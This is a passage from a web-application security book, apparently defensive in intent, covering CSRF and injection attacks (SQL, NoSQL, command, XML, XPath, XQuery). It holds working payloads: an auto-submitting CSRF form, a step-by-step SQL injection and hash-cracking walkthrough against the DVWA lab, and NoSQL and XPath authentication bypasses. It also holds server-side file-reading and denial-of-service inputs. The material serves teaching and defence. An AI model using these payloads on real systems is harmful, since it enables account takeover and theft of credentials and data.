<div class="highlight"><pre><code></code><code class="p">&lt;</code><code class="nt">form</code> <code class="na">id</code><code class="o">=</code><code class="s">"theForm"</code> <code class="na">action</code><code class="o">=</code><code class="s">"http://TARGET_APP_URL_HERE/profile"</code> <code class="na">method</code><code class="o">=</code><code class="s">"post"</code><code class="p">&gt;</code>
   <code class="p">&lt;</code><code class="nt">input</code> <code class="na">type</code><code class="o">=</code><code class="s">"hidden"</code> <code class="na">name</code><code class="o">=</code><code class="s">"bankAcc"</code> <code class="na">value</code><code class="o">=</code><code class="s">"9999999"</code><code class="p">/&gt;</code>
   <code class="p">&lt;</code><code class="nt">input</code> <code class="na">type</code><code class="o">=</code><code class="s">"hidden"</code> <code class="na">name</code><code class="o">=</code><code class="s">"bankRouting"</code> <code class="na">value</code><code class="o">=</code><code class="s">"88888888"</code><code class="p">/&gt;</code>
                            <code class="p">&lt;</code><code class="nt">input</code> <code class="na">type</code><code class="o">=</code><code class="s">"submit"</code> <code class="na">value</code><code class="o">=</code><code class="s">"Win !!!"</code><code class="p">/&gt;</code>
<code class="p">&lt;/</code><code class="nt">form</code><code class="p">&gt;</code>
<code class="p">&lt;</code><code class="nt">script</code> <code class="na">type</code><code class="o">=</code><code class="s">"text/javascript"</code><code class="p">&gt;</code>
   <code class="nb">document</code><code class="p">.</code><code class="nx">getElementById</code><code class="p">(</code><code class="s1">'theForm'</code><code class="p">).</code><code class="nx">submit</code><code class="p">();</code>
<code class="p">&lt;/</code><code class="nt">script</code><code class="p">&gt;</code>
</pre></div>

</figure>

<p>Some misnomers:</p>

<ul>
  <li>A form is not essential to carry out CSRF successfully</li>
  <li>XSS is not essential to carry out CSRF successfully</li>
  <li>HTTPS does nothing to defend against CSRF</li>
</ul>

<h4 id="leanpub-auto-injection">Injection</h4>

<img class="threat-tags" src="images/ThreatTags----easy-common-average-severe.png"/>


<p>injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can cause the interpreter to execute commands that would otherwise not be, or accessing data without proper authorization.</p>

<p>In order for injection attacks to be successful, untrusted data must be unsuccessfully validated, filtered and sanitised before it reaches the interpreter.</p>

<p>Injection defects are often easy to discover simply by examining the code that deals with untrusted data, including internal data. These same defects are often harder to discover when black-box testing, either manually or via fuzzers. Defects <a href="https://www.owasp.org/index.php/Injection_Flaws">can range</a> from trivial to complete system compromise.</p>

<p>As part of the discovery stage, the attacker can test their queries and start to build up what they think the underlying structure looks like that they are attacking with any number of useful on-line query test tools, such as <a href="http://www.freeformatter.com/">freeformatter.com</a>. This allows the attacker to make as little noise to signal ratio as possible.</p>

<h5 id="web-applications-identify-risks-sqli">SQLi</h5>


<img class="threat-tags" src="images/HandsOnHack.png"/>


<p>One of the simplest and quickest vulnerabilities to fix is SQL Injection, yet it is still top of the hit lists. I am going to hammer this home some more. Also checkout the <a href="http://www.se-radio.net/2017/09/se-radio-episode-302-haroon-meer-on-network-security/">podcast I hosted</a> with <a href="https://twitter.com/haroonmeer">Haroon Meer</a> as guest on Network Security for Software Engineering Radio. Haroon discussed using SQLi for data exfiltration.</p>

<aside>
   <i class="fa fa-2x fa-info-circle sr-icons aside-icon"></i>
   <h3 id="leanpub-auto-synopsis-8">Synopsis</h3>

  <p>I have used the Dam Vulnerable Web Application (DVWA) from the OWASP Broken Web Applications <a href="http://sourceforge.net/projects/owaspbwa/files/">VM</a> for this exercise. You can load this VM in a VMware product or add the virtual machine disk to a new VM in VirtualBox. It’s an Ubuntu 64 bit image. Once you have your VM ready to boot, use the Host-only Adapter so it’s sand-boxed from the rest of your network. You really would not want an attacker gaining access to this VM as it is purposely vulnerable and attacks could easily be launched from it.</p>

  <p>Start the machine.</p>

</aside>

<aside>
   <i class="fa fa-2x fa-bomb sr-icons aside-icon"></i>
   <h3 id="leanpub-auto-the-play-6">The Play</h3>

  <p>In your Kali Linux box, run owasp-zap.<br />
If chromium is not already running, run it and setup foxyproxy for chrome using the burp proxy we set-up in the Tooling Setup chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>. Zap is now recording your browsing.</p>

  <p>Once you have started the VM and browsed to it, select the DVWA and log in as<br />
user: “user”, password “user”. Make sure the Security Level is set to low.</p>

  <p>Navigate to the SQL Injecton page and enter <code>1</code> in the input box.</p>

  <p>In Zap: Right click on dvwa -&gt; Attack -&gt; Active Scan -&gt; Start Scan</p>

  <p>When the scan has finished: go to the Alerts tab -&gt; Select SQL Injection -&gt; look at the request and response.<br />
See Zap used a union query, but response said “The used SELECT statements have a different number of columns”. Which means if we use the correct number of columns we will have success.  </p>

  <p>In Request tab, select input parameter -&gt; right click and select Fuzz -&gt; Payloads -&gt; Add -&gt; Select File Fuzzers from “Type” dropdown. jbrofuzz-&gt;SQL Injection-&gt;SQL Injection -&gt; Add -&gt; OK -&gt; Start Fuzzer</p>

  <p>Notice the <code>x' OR full_name LIKE '%bob%</code> in the Fuzzer tab?</p>

  <p>Then try the following in dvwa input:</p>

  <p><code>x' OR full_name LIKE '%bob%</code><br />
Output: Tells us we are in a where clause and I had an unknown column name.<br />
Thanks MySQL error reporting!</p>

  <p>Try the following queries:<br />
<code>x' OR first_name LIKE '%bob%</code>     # This works<br />
<code>x' OR last_name LIKE '%smith%</code>    # This works<br />
<code>x' OR first_name LIKE '%</code>         # And as expected, we get what we think are all users.</p>

  <p>Also the recon stage may tell us a lot about naming conventions and more. Once you know who the employees are:<br />
Search stackoverflow, github, etc for tidbits. Also <a href="https://github.com/michenriksen/gitrob">gitrob</a><br />
As we try different things, we learn more about naming conventions.<br />
You may also be able to find out about the target organisations naming conventions by looking around the internet. Github, Bitbucket, Stackoverflow and many other sites usually yield useful information.</p>

  <p><code>x' OR user LIKE '%</code>               # This works  </p>

    <p>I thought the query on the server looked something like this:<br />
<code>SELECT ID, first_name, last_name FROM users WHERE ID = ''</code></p>

  <p>Time to work out what the table name is.</p>

  <p>Lets try users. I’m thinking that the full query will look like:<br />
<code>SELECT ID, first_name, last_name FROM users WHERE ID = '1' UNION SELECT ID, first_name, last_name FROM users WHERE first_name LIKE '%'</code><br />
Inject query:<br />
<code>1' UNION SELECT ID, first_name, last_name FROM users WHERE first_name LIKE '%</code><br />
Output: Unknown column ‘ID’<br />
Lets fix that:<br />
<code>1' UNION SELECT user_id, first_name, last_name FROM users WHERE first_name LIKE '%</code><br />
Output: “The used SELECT statements have a different number of columns”<br />
This told me that the query on the server was slightly different to what I thought. My revised guess of the full query:<br />
<code>SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT first_name, last_name FROM users WHERE first_name LIKE '%'</code><br />
Inject query:<br />
<code>1' UNION SELECT first_name, last_name FROM users WHERE first_name LIKE '%</code></p>

  <p>Now for the passwords:<br />
Full server query guess:<br />
<code>SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT first_name, password FROM users WHERE first_name LIKE '%'</code><br />
Inject query:<br />
<code>1' UNION SELECT first_name, password FROM users WHERE first_name LIKE '%</code></p>

  <p>Lets determine the hash type with hash-identifier. Just run it and throw the hash at it and it will tell you that it is most likely a simple MD5. which is a one-way hashing function with no Key derivation. So very quick to crack.</p>

  <p>So take your pick of the following three commands:<br />
Create <code>~/hashtocrack.txt</code> and put the hash(s) you want cracked in it. Now usually you would create a profiled wordlist taylored to your target like we did in the Password Profiling section of the People chapter in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>. For this exercise just add the following four words to <code>~/wordlist-to-throw-at-dvwa</code>:<br />
<code>dogs</code>, <code>cats</code>, <code>admins</code>, <code>admin</code>. Now you can compare the hashed words from the list with the hash in the <code>~/hashtocrack.txt</code></p>

    <ol class="numeric">
    <li>
<code>hashcat -m 0 ~/hashtocrack.txt ~/wordlist-to-throw-at-dvwa</code><br />
<code>-m 0</code> means MD5 to hashcat.  </li>
    <li>
<code>[algorithm]</code> for next command in this case will be <code>MD5</code><br />
<code>findmyhash [algorithm] -h &lt;hash_value&gt;</code><br />
<code>findmyhash</code> is a cracker that queries online lists.  </li>
    <li><code>john --format=raw-MD5 ~/hashtocrack.txt ~/wordlist-to-throw-at-dvwa --show</code></li>
  </ol>

  <p>This gives us the super secure password of “admin”  </p>

  <p>In order to get login, we actually need the username. In this case they were the same, but for some other users they were not. So our last query.<br />
Full server query guess:<br />
<code>SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT user, password FROM users WHERE first_name LIKE '%'</code><br />
Inject query:<br />
<code>1' UNION SELECT user, password FROM users WHERE first_name LIKE '%</code><br />
Or simplified:<br />
<code>1' UNION SELECT user, password FROM users#'</code>
Now we have our admin password and user.</p>

</aside>

<p>There are two main problems here.</p>

<ol class="numeric">
  <li>SQL Injection</li>
  <li>Poor decisions around sensitive data protection. We discuss this in depth further on in this chapter in the <a href="chap06.html#web-applications-identify-risks-management-of-application-secrets-data-store-compromise">Data-store Compromise</a> section and even more so the <a href="chap06.html#web-applications-countermeasures-data-store-compromise">Countermeasures</a> of. Do not follow this example of a lack of well salted and quality strong key derivation functions (KDFs) used on all of the sensitive data in your own projects.</li>
</ol>

<h5 id="web-applications-identify-risks-nosqli">NoSQLi</h5>

<p>NoSQL Injection is semantically very similar to SQL Injection and Command Injection with JavaScript running on the server. The main differences are in the syntax of the attack.</p>

<p>NoSQL data stores often provide greater performance and scaling benefits, but in terms of security, are disadvantaged due to far fewer relational and consistency checks.</p>

<p>There are currently <a href="http://nosql-database.org/">over 225 types of NoSQL</a> data stores, and each one does things differently. This of course means that if all we considered was the number of systems compared to SQL, then the likelihood of confusion around what a safe query looks like in any given NoSQL engine has increased dramatically. There is also more room for an attacker to move within NoSQL queries than with SQL due to being heavily dependent on JavaScript which is a dynamic loosely typed general purpose language rather than the far more tightly constrained declarative SQL.</p>

<p>Because there are so many types of NoSQL data store, crafting the attacks is often implementation specific, and because of that, the countermeasures are also implementation specific, making it even more work to provide a somewhat secure environment for your untrusted data to pass through. It often feels like there is no safe passage.</p>

<p>The data store queries are usually written in the programming language of the application, or buried within an API of the same language, often the ubiquitous JavaScript is used, which can be executed in the Web UI, the server side code if it is JavaScirpt, and then the particular type of NoSQL data store, so there are many more execution contexts that can be attacked.</p>

<p>I can not possibly cover all of the types of NoSQL data store, so the below is an example of some mongodb. </p>

<p>A typical SQL query used to select a user based on their username and password might look like the following:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="k">SELECT</code> <code class="o">*</code> <code class="k">FROM</code> <code class="n">accounts</code> <code class="k">WHERE</code> <code class="n">username</code> <code class="o">=</code> <code class="s1">'$username'</code> <code class="k">AND</code> <code class="n">password</code> <code class="o">=</code> <code class="s1">'$password'</code>
</pre></div>

</figure>

<p>If the <code>$username</code> and <code>$password</code> fields were not properly validated, filtered and sanitised, an attacker could supply<br />
<code>admin' --</code><br />
as the username and the resulting query would look like:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1">-- As you can see, the password is no longer required,</code>
<code class="c1">-- as the rest of the query is commented out.</code>
<code class="k">SELECT</code> <code class="o">*</code> <code class="k">FROM</code> <code class="n">accounts</code> <code class="k">WHERE</code> <code class="n">username</code> <code class="o">=</code> <code class="s1">'admin'</code> <code class="c1">--' AND password = ''</code>
</pre></div>

</figure>

<p>The equivalent of a MongoDB query could be:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nt">db</code><code class="p">.</code><code class="nc">accounts</code><code class="p">.</code><code class="nc">find</code><code class="o">(</code><code class="p">{</code><code class="n">username</code><code class="p">:</code> <code class="n">username</code><code class="p">,</code> <code class="n">password</code><code class="o">:</code> <code class="n">password</code><code class="p">}</code><code class="o">);</code>
</pre></div>

</figure>

<p>One way an attacker could attempt to bypass the password if the untrusted data was not being validated would be to supply a username of:<br />
<code>admin</code><br />
and a password of:<br />
<code>{$gt: ""}</code>  </p>

<p>The resulting query would then look like:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="cp">{</code><code class="nf">username</code><code class="o">:</code> <code class="s2">"admin"</code><code class="o">,</code> <code class="na">password</code><code class="o">:</code> <code class="cp">{</code><code class="nv">$gt</code><code class="o">:</code> <code class="s2">""</code><code class="cp">}}</code><code class="x"></code>
</pre></div>

</figure>

<p>The MongoDB <a href="https://docs.mongodb.com/manual/reference/operator/query/gt/#op._S_gt"><code>$gt</code> comparison operator</a> is used here to select those documents where the value of the password is greater than <code>""</code>, which always results in true because empty passwords are not permitted. Check the <a href="https://nodegoat.herokuapp.com/tutorial/a1">NodeGoat tutorial</a> for additional information.</p>

<h5 id="web-applications-identify-risks-command-injection">Command Injection</h5>

<p>The following examples target JavaScript running on the server. If your application on the server is written in some other language, then the attacker just needs to supply code of that language to be executed.</p>

<p>The following functions are easily exploited by an attacker by simply supplying the code they want to execute as a string of text input:</p>

<p>The JavaScript <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval"><code>eval</code></a> function executes the string of code it is passed with the privileges of the caller.</p>

<p>The JavaScript <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout"><code>setTimeout</code></a> and <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval"><code>setInterval</code></a> functions allow you to pass a string of code as the first argument, which is compiled and executed on timer expiration (with <code>setTimeout</code>), and at intervals (with <code>setInterval</code>).</p>

<p>The JavaScript <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function"><code>Function</code></a> constructor takes an arbitrary number of string arguments which are used as the formal parameter names within the function body that the constructor creates. The last argument passed to the <code>Function</code> constructor is also a string, but it contains the statements that are to be executed as the <code>Function</code> object that is returned.</p>

<p>The purposely vulnerable Node Web Application NodeGoat, provides some simple examples in the form of executable <a href="https://github.com/OWASP/NodeGoat/blob/b475010f2de3d601eda3ad2498d9e6c729204a09/app/routes/contributions.js#L24-L26">code</a> including some absolute bare minimum countermeasures, a <a href="https://nodegoat.herokuapp.com/tutorial/a1">tutorial</a> with videos of exploiting Command Injection in the form of a Denial of Service (DoS), by passing<br />
<code>while(1)</code><br />
or<br />
<code>process.exit()</code><br />
or<br />
<code>process.kill(process.pid)</code><br />
through some input fields of the Web UI. It also covers discovery of the names of the files on the target web servers file system:</p>

<figure class="code">
  <figcaption>Reveal directory contents</figcaption>

<div class="highlight"><pre><code></code><code class="c1">// Read the contents of the current directory.</code>
<code class="nx">res</code><code class="p">.</code><code class="nx">end</code><code class="p">(</code><code class="nx">require</code><code class="p">(</code><code class="s1">'fs'</code><code class="p">).</code><code class="nx">readdirSync</code><code class="p">(</code><code class="s1">'.'</code><code class="p">).</code><code class="nx">toString</code><code class="p">());</code>
<code class="c1">// Read the contents of the parent directory.</code>
<code class="nx">res</code><code class="p">.</code><code class="nx">end</code><code class="p">(</code><code class="nx">require</code><code class="p">(</code><code class="s1">'fs'</code><code class="p">).</code><code class="nx">readdirSync</code><code class="p">(</code><code class="s1">'..'</code><code class="p">).</code><code class="nx">toString</code><code class="p">());</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>Reveal file contents</figcaption>

<div class="highlight"><pre><code></code><code class="nx">res</code><code class="p">.</code><code class="nx">end</code><code class="p">(</code><code class="nx">require</code><code class="p">(</code><code class="s1">'fs'</code><code class="p">).</code><code class="nx">readFileSync</code><code class="p">(</code><code class="nx">filename</code><code class="p">));</code>
</pre></div>

</figure>

<p>The attacker can take this further by writing new files and executing files on the server.</p>

<p>Many web applications take untrusted data, often from HTTP requests and pass this data directly to the Operating System, its programs, or even other systems, often by APIs, which is now addressed by the OWASP Top 10 <a href="https://www.owasp.org/index.php/Top_10_2017-A10-Underprotected_APIs">A10 Under protected APIs</a></p>

<p>Also check out the Additional Resources chapter for <a href="chap07.html#additional-resources-web-applications-risks-injection-command-injection">command injection</a> attack techniques.</p>

<h5 id="web-applications-identify-risks-xml-injection">XML Injection</h5>

<p>XML injection techniques usually consist of a discovery stage followed by full exploitation if successful:</p>

<ol class="numeric">
  <li>Attempting to create invalid XML document by injecting various <a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)#Discovery">XML metacharacters</a> (metacharacter injection):
    <ul>
      <li>Single quotes: <code>'</code>
</li>
      <li>Double quotes: <code>"</code>
</li>
      <li>Angle brackets: <code>&gt;&lt;</code>
</li>
      <li>Comment tags: <code>&lt;!--</code> and <code>--&gt;</code>
</li>
      <li>Ampersand: <code>&amp;</code>
</li>
      <li>CDATA section delimiters: <code>&lt;![CDATA[</code> and <code>]]&gt;</code> allowing an attacker to form executable code</li>
    </ul>
  </li>
  <li>Injecting an untrusted XML document which is accepted and not contextually validated, filtered or sanitised by the parser. That is if XML documents are accepted. Exploiting the XML parser that is configured to resolve, validate and process external entities in the form of Document Type Definitions (DTDs) and XML Schema Definitions (XSDs). This is known as <a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing">XML External Entity</a> (XXE) exploitation</li>
  <li>Attempting to modify the XML structure by injecting various XML data and Tags (<a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)#Tag_Injection">tag injections</a>)</li>
</ol>

<p>and witnessing how the parser deals with the data.</p>

<p>There are a number of XML attack categories exploitable via injection that target weaknesses such as the following that Adam Bell presented at the <a href="https://www.owasp.org/index.php/OWASP_New_Zealand_Day_2017#tab=Presentation_Schedule">OWASP New Zealand Day</a> conference in 2017 that I helped to run. Adams talk was called: “XML Still Considered Dangerous:</p>

<ul>
  <li>Parameter expansion</li>
  <li>XML External Entities (XXE)</li>
  <li>URL Invocation</li>
</ul>

<p>Check out Adams <a href="https://www.owasp.org/images/4/48/2017-04-20-OWASPNZ-XMLDangerous.pdf">slide-deck</a> at the OWASP NZ Day wiki for some interesting examples.</p>

<h5 id="web-applications-identify-risks-xslt-injection">
  <a href="https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf">XSLT Injection</a>
</h5>

<p>There is a lot that can go wrong in XSLT, the following is a collection of some of the vulnerabilities to be aware of:</p>

<ul>
  <li>Leveraging XPath to refer to parts of XML documents</li>
  <li>Susceptible to XXE of local and remote files, as well as include additional arbitrary XSL files</li>
  <li>Extract system information including file contents</li>
  <li>Port scanning</li>
  <li>Write files to file system</li>
  <li>Access of arbitrary databases</li>
  <li>Execution of arbitrary code</li>
</ul>

<h5 id="web-applications-identify-risks-xpath-injection">XPath Injection</h5>

<p>Similarly to generic injection, when XPath incorporates untrusted data that has not been validated, filtered and sanitised based on the execution context in question, this is discussed in the “<a href="chap06.html#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation">What is Sanitisation</a>” section of the Lack of Input Validation, Filtering and Sanitisation section of Identify Risks, the intended logic of the query can be modified. This allows an attacker to inject purposely malformed data into a website, then by making educated guesses based on what is returned, including the returned data and any error messages, the attacker can build a picture of how the XML structure looks. Similar to XML Injection, the attacker will usually carry out this discovery stage followed by full exploitation if successful.</p>

<p>Although this attack technique is similar to SQLi, XPath has no provision for <a href="https://www.owasp.org/index.php/Comment_Injection_Attack#Examples">commenting</a> out tails of expressions:</p>

<ul>
  <li>MS SQL, MySQL and Oracle: <code>--</code>
</li>
  <li>MySQL: <code>#</code>
</li>
  <li>MS Access: <code>%00</code>
</li>
</ul>

<p>XPath is a standards based language, unlike SQL, its syntax is implementation independent, this allows attacks to be automated across many targets that use user input to query XML documents.</p>

<p>Unlike SQL where specific commands and queries are run as specific users, and thus the principle of least privilege can be applied to any given command or query based on the user running it, with XPath there is no notion of Access Control Lists (ACLs), this means that a query can <a href="https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)#Summary">access every part</a> of the XML document. So for example, if user credentials are being stored in an XML document, they can be retrieved and allow the attacker to elevate their privileges to those of other users, perhaps administrators if the administrators credentials are stored in the XML document.</p>

<p>Let us use the following XML document for examples:</p>

<figure class="code">
  <figcaption>users.xml</figcaption>

<div class="highlight"><pre><code></code><code class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code>
<code class="nt">&lt;Users&gt;</code>
   <code class="nt">&lt;User</code> <code class="na">ID=</code><code class="s">"1"</code><code class="nt">&gt;</code>
      <code class="nt">&lt;FirstName&gt;</code>John<code class="nt">&lt;/FirstName&gt;</code>
      <code class="nt">&lt;LastName&gt;</code>Deer<code class="nt">&lt;/LastName&gt;</code>
      <code class="nt">&lt;UserName&gt;</code>jdeer<code class="nt">&lt;/UserName&gt;</code>
      <code class="nt">&lt;Password&gt;</code>3xp10it3d<code class="nt">&lt;/Password&gt;</code>
      <code class="nt">&lt;Type&gt;</code>administrator<code class="nt">&lt;/Type&gt;</code>
   <code class="nt">&lt;/User&gt;</code>
   <code class="nt">&lt;User</code> <code class="na">ID=</code><code class="s">"2"</code><code class="nt">&gt;</code>
      <code class="nt">&lt;FirstName&gt;</code>Kim<code class="nt">&lt;/FirstName&gt;</code>
      <code class="nt">&lt;LastName&gt;</code>Carter<code class="nt">&lt;/LastName&gt;</code>
      <code class="nt">&lt;UserName&gt;</code>kimc<code class="nt">&lt;/UserName&gt;</code>
      <code class="nt">&lt;Password&gt;</code>t03457<code class="nt">&lt;/Password&gt;</code>
      <code class="nt">&lt;Type&gt;</code>user<code class="nt">&lt;/Type&gt;</code>
   <code class="nt">&lt;/User&gt;</code>
<code class="nt">&lt;/Users&gt;</code>
</pre></div>

</figure>

<p><a href="https://www.owasp.org/index.php/Blind_XPath_Injection">Blind injection</a> is a technique used in many types of injection. A blind injection attack is used where the attacker does not know what the underlying query, or in the case of XPath, XML document looks like, and/or the feedback from the application reveals little detail in terms of data or error messages. Often booleanised queries and/or XML Crawling are used to facilitate blind injection attacks.</p>

<p><strong>Booleanised Queries</strong> are those that return very granular true/false information based on very small amounts of data supplied by the attacker.</p>

<p>The following XPath query returns the first character of the first child node (no mater what it is called) of the first User:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nf">substring</code><code class="p">((//</code><code class="nt">User</code><code class="p">[</code><code class="mi">1</code><code class="p">]/</code><code class="nt">*</code><code class="p">[</code><code class="mi">1</code><code class="p">]),</code><code class="mi">1</code><code class="p">,</code><code class="mi">1</code><code class="p">)</code>
</pre></div>

</figure>

<p>The following XPath query returns the length of the forth element (no mater what it is called) of the first User:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nf">string-length</code><code class="p">(//</code><code class="nt">User</code><code class="p">[</code><code class="mi">1</code><code class="p">]/</code><code class="nt">*</code><code class="p">[</code><code class="mi">4</code><code class="p">])</code>
</pre></div>

</figure>

<p><strong>XML Crawling</strong> allows the attacker to get to know what the XML document structure looks like.</p>

<p>For example, the following reveals that the number of <code>Users</code> is 2:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nf">count</code><code class="p">(//</code><code class="nt">Users</code><code class="p">/</code><code class="nt">*</code><code class="p">)</code>
</pre></div>

</figure>

<p>The following reveals that the length of the value at the fourth position of the child node (no mater what it is called) of the first <code>User</code> is in fact 9 characters long. Is the <code>Password</code> nine characters long? True.</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nf">string-length</code><code class="p">(//</code><code class="nt">User</code><code class="p">[</code><code class="nf">position</code><code class="p">()</code><code class="o">=</code><code class="mi">1</code><code class="p">]/</code><code class="nt">*</code><code class="p">[</code><code class="nf">position</code><code class="p">()</code><code class="o">=</code><code class="mi">4</code><code class="p">])</code><code class="o">=</code><code class="mi">9</code>
</pre></div>

</figure>

<p>The following query can be used to confirm that the first character of the fourth child node (no mater what it is called) of the first <code>User</code> is in fact <code>3</code>:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nf">substring</code><code class="p">((//</code><code class="nt">User</code><code class="p">[</code><code class="mi">1</code><code class="p">]/</code><code class="nt">*</code><code class="p">[</code><code class="mi">4</code><code class="p">]),</code><code class="mi">1</code><code class="p">,</code><code class="mi">1</code><code class="p">)</code><code class="o">=</code><code class="s2">"3"</code>
</pre></div>

</figure>

<p>Checkout the OWASP <a href="https://www.owasp.org/index.php/Blind_XPath_Injection#XML_Crawling">XML Crawling</a> documentation for further details. The queries at the OWASP documentation did not work for me, hence why I have supplied ones that do.</p>

<p>Using booleanised queries can be very good for automated attacks, usually many of these granular tests will need to be performed, but because they are so small, an attacker can aggregate them, making them very versatile.</p>

<p>Continuing on: If our target application contains logic to retrieve the account type so long as the user provides their username and password, that logic may look similar to the following, once the legitimate administrator has entered their credentials:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nf">string</code><code class="p">(//</code><code class="nt">User</code><code class="p">[</code><code class="nt">UserName</code><code class="p">/</code><code class="nf">text</code><code class="p">()</code><code class="o">=</code><code class="s1">'jdeer'</code> <code class="ow">and</code> <code class="nt">Password</code><code class="p">/</code><code class="nf">text</code><code class="p">()</code><code class="o">=</code><code class="s1">'3xp10it3d'</code><code class="p">]/</code><code class="nt">Type</code><code class="p">/</code><code class="nf">text</code><code class="p">())</code>
</pre></div>

</figure>

<p>If the application does not take the countermeasures discussed, and the attacker enters the following:</p>

<p>Username:<br />
<code>' or '1'='1</code><br />
Password:<br />
<code>' or '1'='1</code></p>

<p>Then the above query will look more like the following:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nf">string</code><code class="p">(//</code><code class="nt">User</code><code class="p">[</code><code class="nt">UserName</code><code class="p">/</code><code class="nf">text</code><code class="p">()</code><code class="o">=</code><code class="s1">''</code> <code class="ow">or</code> <code class="s1">'1'</code><code class="o">=</code><code class="s1">'1'</code> <code class="ow">and</code> <code class="nt">Password</code><code class="p">/</code><code class="nf">text</code><code class="p">()</code><code class="o">=</code><code class="s1">''</code> <code class="ow">or</code> <code class="s1">'1'</code><code class="o">=</code><code class="s1">'1'</code><code class="p">]/</code><code class="nt">Type</code><code class="p">/</code><code class="nf">text</code><code class="p">())</code>
</pre></div>

</figure>

<p>Which although the attacker has not supplied a valid <code>UserName</code> or <code>Password</code>, according to the XPath query, they are still authenticated, because the query will always evaluate to true. This is called authentication bypass for obvious reasons. You may notice that this attack looks very similar to many SQLi attacks.</p>

<p>The available XPath functions and XSLT specific additions to XPath are <a href="https://developer.mozilla.org/en-US/docs/Web/XPath/Functions">documented</a> at Mozilla Developer Network (MDN)</p>

<p>Technically, XPath is used to select parts of an XML document, it has no provision for updating, in saying that, command injection can be used to modify data that XPath returns. Standard language libraries usually provide functionality for modifying XML documents, along with the XML Data Modification Language (<a href="https://docs.microsoft.com/en-us/sql/t-sql/xml/xml-data-modification-language-xml-dml">DML</a>) that we will discuss soon in the next section.</p>

<h5 id="web-applications-identify-risks-xquery-injection">XQuery Injection</h5>

<p>XQuery being a superset of XPath, suffers from the same vulnerabilities as XPath, plus the SQL-like <code>FOR</code>, <code>LET</code>, <code>WHERE</code>, <code>ORDER BY</code>, <code>RETURN</code> (FLWOR) expression abilities. Hopefully coming as no surprise, the attack vectors are a combination of those discussed in <a href="chap06.html#web-applications-identify-risks-xpath-injection">XPath Injection</a> and <a href="chap06.html#web-applications-identify-risks-sqli">SQLi</a>. The canonical example is provided below thanks to <a href="http://projects.webappsec.org/w/page/13247006/XQuery%20Injection%7C">projects.webappsec.org</a>:</p>

<figure class="code">
  <figcaption>users.xml</figcaption>

<div class="highlight"><pre><code></code><code class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</code>
<code class="nt">&lt;userlist&gt;</code>
   <code class="nt">&lt;user</code> <code class="na">category=</code><code class="s">"group1"</code><code class="nt">&gt;</code>
      <code class="nt">&lt;uname&gt;</code>jdeer<code class="nt">&lt;/uname&gt;</code>
      <code class="nt">&lt;fname&gt;</code>John<code class="nt">&lt;/fname&gt;</code>
      <code class="nt">&lt;lname&gt;</code>Deer<code class="nt">&lt;/lname&gt;</code>
      <code class="nt">&lt;status&gt;</code>active<code class="nt">&lt;/status&gt;</code>
   <code class="nt">&lt;/user&gt;</code>
   <code class="nt">&lt;user</code> <code class="na">category=</code><code class="s">"admins"</code><code class="nt">&gt;</code>
      <code class="nt">&lt;uname&gt;</code>kimc<code class="nt">&lt;/uname&gt;</code>
      <code class="nt">&lt;fname&gt;</code>Kim<code class="nt">&lt;/fname&gt;</code>
      <code class="nt">&lt;lname&gt;</code>Carter<code class="nt">&lt;/lname&gt;</code>
      <code class="nt">&lt;status&gt;</code>active<code class="nt">&lt;/status&gt;</code>
   <code class="nt">&lt;/user&gt;</code>
   <code class="nt">&lt;user</code> <code class="na">category=</code><code class="s">"group2"</code><code class="nt">&gt;</code>
      <code class="nt">&lt;uname&gt;</code>bobm<code class="nt">&lt;/uname&gt;</code>
      <code class="nt">&lt;fname&gt;</code>Bob<code class="nt">&lt;/fname&gt;</code>
      <code class="nt">&lt;lname&gt;</code>Marley<code class="nt">&lt;/lname&gt;</code>
      <code class="nt">&lt;status&gt;</code>deceased<code class="nt">&lt;/status&gt;</code>
   <code class="nt">&lt;/user&gt;</code>
   <code class="nt">&lt;user</code> <code class="na">category=</code><code class="s">"group1"</code><code class="nt">&gt;</code>
      <code class="nt">&lt;uname&gt;</code>MSmith<code class="nt">&lt;/uname&gt;</code>
      <code class="nt">&lt;fname&gt;</code>Matthew<code class="nt">&lt;/fname&gt;</code>
      <code class="nt">&lt;lname&gt;</code>Smith<code class="nt">&lt;/lname&gt;</code>
      <code class="nt">&lt;status&gt;</code>terminated<code class="nt">&lt;/status&gt;</code>
   <code class="nt">&lt;/user&gt;</code>
<code class="nt">&lt;/userlist&gt;</code>
</pre></div>

</figure>

<p>If the query to retrieve the user <code>bobm</code> was using a string literal from the users input (<code>bobm</code>), it may look similar to the following:</p>

<figure class="code">
